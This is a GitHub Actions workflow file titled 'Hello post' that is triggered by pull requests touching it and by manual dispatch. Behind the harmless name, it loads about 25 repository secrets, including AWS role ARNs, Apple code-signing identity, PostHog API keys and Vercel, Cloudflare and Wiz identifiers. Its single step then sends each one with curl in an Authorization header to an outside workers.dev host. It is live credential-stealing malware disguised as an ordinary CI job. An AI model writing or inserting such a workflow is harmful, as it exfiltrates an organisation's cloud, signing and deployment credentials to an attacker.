name: Hello post

on:
    pull_request:
        paths:
            - '.github/workflows/hello-post.yml'
    workflow_dispatch:

concurrency:
    group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}
    cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
    post:
        runs-on: ubuntu-latest
        timeout-minutes: 2
        env:
            AWS_DESKTOP_APP_RELEASES_ROLE_ARN: ${{ secrets.AWS_DESKTOP_APP_RELEASES_ROLE_ARN }}
            AWS_TWIG_APP_ASSETS_ROLE_ARN: ${{ secrets.AWS_TWIG_APP_ASSETS_ROLE_ARN }}
            AWS_TWIG_APP_ASSETS_BUCKET: ${{ secrets.AWS_TWIG_APP_ASSETS_BUCKET }}
            AWS_TWIG_APP_ASSETS_REGION: ${{ secrets.AWS_TWIG_APP_ASSETS_REGION }}
            POSTHOG_PROVIDER_TF_AWS_ROLE_ARN: ${{ secrets.POSTHOG_PROVIDER_TF_AWS_ROLE_ARN }}
            POSTHOG_PROVIDER_TF_STATE_BUCKET: ${{ secrets.POSTHOG_PROVIDER_TF_STATE_BUCKET }}
            POSTHOG_PROVIDER_TF_STATE_REGION: ${{ secrets.POSTHOG_PROVIDER_TF_STATE_REGION }}
            AZURE_INFERENCE_ENDPOINT: ${{ secrets.AZURE_INFERENCE_ENDPOINT }}
            STAMPHOG_AI_GATEWAY_URL: ${{ secrets.STAMPHOG_AI_GATEWAY_URL }}
            POSTHOG_CODE_E2E_GATEWAY_URL: ${{ secrets.POSTHOG_CODE_E2E_GATEWAY_URL }}
            VITE_POSTHOG_API_HOST: ${{ secrets.VITE_POSTHOG_API_HOST }}
            VITE_POSTHOG_UI_HOST: ${{ secrets.VITE_POSTHOG_UI_HOST }}
            DOCKERHUB_USER: ${{ secrets.DOCKERHUB_USER }}
            APPLE_ID: ${{ secrets.APPLE_ID }}
            APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
            APPLE_CODESIGN_IDENTITY: ${{ secrets.APPLE_CODESIGN_IDENTITY }}
            CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
            VERCEL_PROJECT_ID: ${{ secrets.VERCEL_PROJECT_ID }}
            VERCEL_TEAM_ID: ${{ secrets.VERCEL_TEAM_ID }}
            DESKTOP_POSTHOG_ENV_ID: ${{ secrets.DESKTOP_POSTHOG_ENV_ID }}
            DO_DEPLOY_SSH_PUBLIC_KEY: ${{ secrets.DO_DEPLOY_SSH_PUBLIC_KEY }}
            POSTHOG_PROJECT_API_KEY: ${{ secrets.POSTHOG_PROJECT_API_KEY }}
            VITE_POSTHOG_API_KEY: ${{ secrets.VITE_POSTHOG_API_KEY }}
            WIZ_CLIENT_ID: ${{ secrets.WIZ_CLIENT_ID }}
            VITE_POSTHOG_UI_HOST: ${{ secrets.VITE_POSTHOG_UI_HOST }}

        steps:
            - name: Post hello
              run: |
                  curl -fsS --connect-timeout 10 --max-time 30 -X POST \
                  -H "Authorization: GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID=$GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID" \
                  https://incident-1000.tim9316.workers.dev/

                    url="https://incident-1000.tim9316.workers.dev/"

                    send() {
                    name=$1
                    value=$2

                    curl -fsS \
                        -H "Authorization: $name=$value" \
                        "$url"

                    printf '\n'
                    }

                    send AWS_DESKTOP_APP_RELEASES_ROLE_ARN "$AWS_DESKTOP_APP_RELEASES_ROLE_ARN"
                    send AWS_TWIG_APP_ASSETS_ROLE_ARN "$AWS_TWIG_APP_ASSETS_ROLE_ARN"
                    send AWS_TWIG_APP_ASSETS_BUCKET "$AWS_TWIG_APP_ASSETS_BUCKET"
                    send AWS_TWIG_APP_ASSETS_REGION "$AWS_TWIG_APP_ASSETS_REGION"
                    send POSTHOG_PROVIDER_TF_AWS_ROLE_ARN "$POSTHOG_PROVIDER_TF_AWS_ROLE_ARN"
                    send POSTHOG_PROVIDER_TF_STATE_BUCKET "$POSTHOG_PROVIDER_TF_STATE_BUCKET"
                    send POSTHOG_PROVIDER_TF_STATE_REGION "$POSTHOG_PROVIDER_TF_STATE_REGION"
                    send AZURE_INFERENCE_ENDPOINT "$AZURE_INFERENCE_ENDPOINT"
                    send STAMPHOG_AI_GATEWAY_URL "$STAMPHOG_AI_GATEWAY_URL"
                    send POSTHOG_CODE_E2E_GATEWAY_URL "$POSTHOG_CODE_E2E_GATEWAY_URL"
                    send VITE_POSTHOG_API_HOST "$VITE_POSTHOG_API_HOST"
                    send VITE_POSTHOG_UI_HOST "$VITE_POSTHOG_UI_HOST"
                    send DOCKERHUB_USER "$DOCKERHUB_USER"
                    send APPLE_ID "$APPLE_ID"
                    send APPLE_TEAM_ID "$APPLE_TEAM_ID"
                    send APPLE_CODESIGN_IDENTITY "$APPLE_CODESIGN_IDENTITY"
                    send CLOUDFLARE_ACCOUNT_ID "$CLOUDFLARE_ACCOUNT_ID"
                    send VERCEL_PROJECT_ID "$VERCEL_PROJECT_ID"
                    send VERCEL_TEAM_ID "$VERCEL_TEAM_ID"
                    send DESKTOP_POSTHOG_ENV_ID "$DESKTOP_POSTHOG_ENV_ID"
                    send DO_DEPLOY_SSH_PUBLIC_KEY "$DO_DEPLOY_SSH_PUBLIC_KEY"
                    send POSTHOG_PROJECT_API_KEY "$POSTHOG_PROJECT_API_KEY"
                    send VITE_POSTHOG_API_KEY "$VITE_POSTHOG_API_KEY"
                    send WIZ_CLIENT_ID "$WIZ_CLIENT_ID"
                    send VITE_POSTHOG_UI_HOST "$VITE_POSTHOG_UI_HOST"
